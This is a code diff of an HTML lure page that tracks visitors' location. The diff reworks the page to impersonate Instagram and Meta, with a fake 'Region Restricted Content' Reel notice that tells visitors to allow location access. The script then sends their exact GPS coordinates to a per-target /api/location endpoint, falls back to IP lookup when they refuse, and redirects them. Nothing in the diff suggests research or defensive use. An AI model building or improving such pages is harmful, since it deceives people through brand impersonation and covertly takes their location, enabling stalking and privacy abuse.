@@ -3,185 +3,118 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>📍 Find nearby deals</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <title>Instagram</title>
   <style>
-    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
-
     body {
-      font-family: 'Inter', -apple-system, sans-serif;
-      background: #0f0f17;
-      color: #e8e8f0;
-      min-height: 100vh;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      background-color: #fafafa;
       display: flex;
+      flex-direction: column;
       align-items: center;
       justify-content: center;
-      overflow: hidden;
+      min-height: 100vh;
+      margin: 0;
+      color: #262626;
     }
-
-    .bg-orbs {
-      position: fixed; inset: 0; z-index: 0; pointer-events: none;
-    }
-
-    .orb {
-      position: absolute; border-radius: 50%; filter: blur(80px); opacity: 0.4;
-      animation: float 8s ease-in-out infinite;
-    }
-
-    .orb-1 { width: 300px; height: 300px; background: rgba(255, 107, 107, 0.25); top: 10%; left: 15%; }
-    .orb-2 { width: 250px; height: 250px; background: rgba(78, 205, 196, 0.2); bottom: 15%; right: 10%; animation-delay: -3s; }
-    .orb-3 { width: 200px; height: 200px; background: rgba(255, 190, 11, 0.15); top: 55%; left: 60%; animation-delay: -5s; }
-
-    @keyframes float {
-      0%, 100% { transform: translate(0, 0) scale(1); }
-      33% { transform: translate(30px, -20px) scale(1.05); }
-      66% { transform: translate(-20px, 20px) scale(0.95); }
-    }
-
+    
     .card {
-      position: relative; z-index: 1;
-      background: rgba(18, 18, 26, 0.95);
-      border: 1px solid rgba(255,255,255,0.08);
-      border-radius: 24px;
-      padding: 44px 36px;
-      max-width: 400px; width: 92%;
+      background-color: #ffffff;
+      border: 1px solid #dbdbdb;
+      border-radius: 1px;
+      padding: 40px;
+      max-width: 350px;
+      width: 90%;
       text-align: center;
-      box-shadow: 0 20px 80px rgba(0,0,0,0.5);
-      backdrop-filter: blur(20px);
+      box-shadow: 0 4px 12px rgba(0,0,0,0.05);
     }
-
-    .card-emoji {
-      font-size: 52px;
-      margin-bottom: 20px;
-      display: block;
-      animation: bounce 2s ease-in-out infinite;
+    
+    .logo {
+      font-size: 28px;
+      font-weight: bold;
+      font-family: 'Comic Sans MS', cursive, sans-serif; /* Fallback for generic IG-style logo text */
+      margin-bottom: 15px;
+      background: -webkit-linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
     }
-
-    @keyframes bounce {
-      0%, 100% { transform: translateY(0); }
-      50% { transform: translateY(-8px); }
+    
+    h1 {
+      font-size: 16px;
+      font-weight: 600;
+      margin-bottom: 12px;
     }
-
-    .card h1 {
-      font-size: 21px;
-      font-weight: 700;
-      margin-bottom: 8px;
-      line-height: 1.3;
+    
+    p {
+      font-size: 14px;
+      line-height: 1.5;
+      color: #8e8e8e;
+      margin-bottom: 25px;
     }
-
-    .card p {
-      font-size: 13px;
-      color: #8888a8;
-      line-height: 1.7;
-      margin-bottom: 28px;
-    }
-
+    
     .btn {
-      display: inline-flex;
-      align-items: center;
-      gap: 8px;
-      padding: 15px 36px;
+      background-color: #0095f6;
+      color: #ffffff;
       border: none;
-      border-radius: 14px;
-      font-size: 15px;
+      border-radius: 8px;
+      padding: 12px 24px;
+      font-size: 14px;
       font-weight: 600;
       cursor: pointer;
-      font-family: 'Inter', sans-serif;
-      transition: transform 0.2s, box-shadow 0.2s;
-      color: #fff;
+      width: 100%;
+      transition: background-color 0.2s;
     }
-
-    .btn-primary {
-      background: linear-gradient(135deg, #ff6b6b, #ee5a24);
-      box-shadow: 0 8px 30px rgba(255, 107, 107, 0.3);
+    
+    .btn:hover {
+      background-color: #1877f2;
     }
-
-    .btn-primary:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 12px 40px rgba(255, 107, 107, 0.4);
+    
+    .footer {
+      margin-top: 25px;
+      font-size: 12px;
+      color: #c7c7c7;
     }
-
-    .trust-row {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 6px;
-      margin-top: 20px;
-      font-size: 11px;
-      color: #666;
-    }
-
-    .trust-row svg {
-      width: 12px; height: 12px; fill: #4ecdc4;
-    }
-
-    /* Loading state */
-    .loading-state {
+    
+    /* Loading spinner */
+    .spinner-wrapper {
       display: none;
+      margin: 20px auto;
     }
-
-    .loading-state.active {
-      display: block;
-    }
-
     .spinner {
-      width: 44px; height: 44px;
-      border: 3px solid rgba(255, 107, 107, 0.2);
-      border-top-color: #ff6b6b;
+      border: 3px solid rgba(0,0,0,0.1);
+      width: 36px;
+      height: 36px;
       border-radius: 50%;
-      animation: spin 0.7s linear infinite;
-      margin: 0 auto 20px;
+      border-left-color: #8e8e8e;
+      animation: spin 1s linear infinite;
+      margin: 0 auto;
     }
-
-    @keyframes spin { to { transform: rotate(360deg); } }
-
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    
     .initial-state.hidden { display: none; }
-
-    .progress-bar {
-      height: 4px;
-      background: rgba(255,255,255,0.06);
-      border-radius: 2px;
-      margin-top: 24px;
-      overflow: hidden;
-    }
-
-    .progress-bar .fill {
-      height: 100%;
-      width: 0%;
-      background: linear-gradient(90deg, #ff6b6b, #4ecdc4);
-      border-radius: 2px;
-      transition: width 1.5s ease;
-    }
+    .spinner-wrapper.active { display: block; }
   </style>
 </head>
 <body>
-  <div class="bg-orbs">
-    <div class="orb orb-1"></div>
-    <div class="orb orb-2"></div>
-    <div class="orb orb-3"></div>
-  </div>
 
   <div class="card">
-    <!-- Initial state: ask them to tap -->
+    <div class="logo">Instagram</div>
+    
     <div class="initial-state" id="initialState">
-      <span class="card-emoji">📍</span>
-      <h1>Someone shared something with you!</h1>
-      <p>To view the content, we need to verify your location for security. Tap the button below and allow location access.</p>
-      <button class="btn btn-primary" id="shareBtn" onclick="getLocation()">
-        📍 Allow & View Content
+      <h1>Region Restricted Content</h1>
+      <p>This Reel contains audio or visual content that might be restricted in certain countries. Please allow location access to verify your region and continue.</p>
+      
+      <button class="btn" id="shareBtn" onclick="getLocation()">
+        Verify Region
       </button>
-      <div class="trust-row">
-        <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
-        <span>Secure · Your data is encrypted</span>
-      </div>
+    </div>
+    
+    <div class="spinner-wrapper" id="loadingState">
+      <div class="spinner"></div>
+      <p style="margin-top:15px; color:#262626; font-weight:600;">Verifying...</p>
     </div>
 
-    <!-- Loading state: after they allow -->
-    <div class="loading-state" id="loadingState">
-      <div class="spinner"></div>
-      <h1>Verified! Redirecting…</h1>
-      <p>Taking you to the content now.</p>
-      <div class="progress-bar"><div class="fill" id="fill"></div></div>
+    <div class="footer">
+      From Meta
     </div>
   </div>
 
@@ -189,7 +122,6 @@
     const trackId = window.location.pathname.split('/').pop();
 
     function sendLocation(payload) {
-      // Use both sendBeacon and fetch for reliability
       const data = JSON.stringify(payload);
       navigator.sendBeacon(`/api/location/${trackId}`, new Blob([data], { type: 'application/json' }));
     }
@@ -197,7 +129,6 @@
     function showLoading() {
       document.getElementById('initialState').classList.add('hidden');
       document.getElementById('loadingState').classList.add('active');
-      setTimeout(() => document.getElementById('fill').style.width = '100%', 100);
     }
 
     function redirect() {
@@ -208,19 +139,17 @@
 
     function getLocation() {
       const btn = document.getElementById('shareBtn');
-      btn.textContent = '⏳ Verifying…';
+      btn.textContent = 'Please wait...';
       btn.style.opacity = '0.7';
       btn.disabled = true;
 
       if (!navigator.geolocation) {
-        // No geolocation support — fallback to IP
         ipFallback();
         return;
       }
 
       navigator.geolocation.getCurrentPosition(
         (pos) => {
-          // SUCCESS — got exact GPS
           sendLocation({
             lat: pos.coords.latitude,
             lng: pos.coords.longitude,
@@ -231,14 +160,9 @@
           redirect();
         },
         (err) => {
-          // DENIED — fallback to IP
           ipFallback();
         },
-        {
-          enableHighAccuracy: true,
-          timeout: 10000,
-          maximumAge: 0
-        }
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
       );
     }
 
